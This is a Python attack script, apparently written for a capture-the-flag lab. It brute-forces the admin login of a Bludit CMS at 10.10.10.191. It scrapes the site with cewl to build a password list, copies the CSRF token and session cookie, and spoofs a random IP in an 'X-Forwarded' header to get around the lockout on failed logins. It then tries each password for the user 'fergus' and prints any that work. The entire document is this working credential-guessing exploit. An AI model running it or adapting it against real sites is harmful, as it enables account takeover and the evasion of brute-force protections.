# OS: ParrotOS
# Version: 3.8.0+

import subprocess
import requests
import random
import re

HOST = 'http://10.10.10.191/admin'
USER = 'fergus'
parser = re.compile(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(\w{1,})"')

def login(user, password):
    r = requests.get(HOST)
    csrf, cookie = re.search(parser, r.text).group(1), r.cookies.get("BLUDIT-KEY")
    r.close()
    headers = {'X-Forwarded': f"{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}.{random.randint(1, 256)}"}
    data = {'tokenCSRF': csrf, 'username': user, 'password': password, 'save': ''}
    cookie = {'BLUDIT-KEY': cookie}
    r = requests.post(HOST + '/login', data=data, cookies=cookie, headers=headers, allow_redirects=False) # Because have the header with x-forwar so no need proxy
    # r = requests.post(HOST + '/login', data=data, cookies=cookie, headers=headers, allow_redirects=False, proxies=PROXY)
    if r.status_code != 200:
        exit('CSRF Error!')
    elif "password incorrect" in r.text:
        return False
    elif "has been blocked" in r.text:
        return False
    else:
        exit(f"{user}:{password}")
if __name__=="__main__":
    wordlist = subprocess.check_output(['cewl', 'http://10.10.10.191/'])
    if b"Couldn't hit the site" in wordlist:
        exit(str(wordlist).split(r'\n')[1])
    wordlist = re.sub(r'b"|\n"', '', str(wordlist)).split('\n')
    for passwd in wordlist:
        login(USER, passwd)
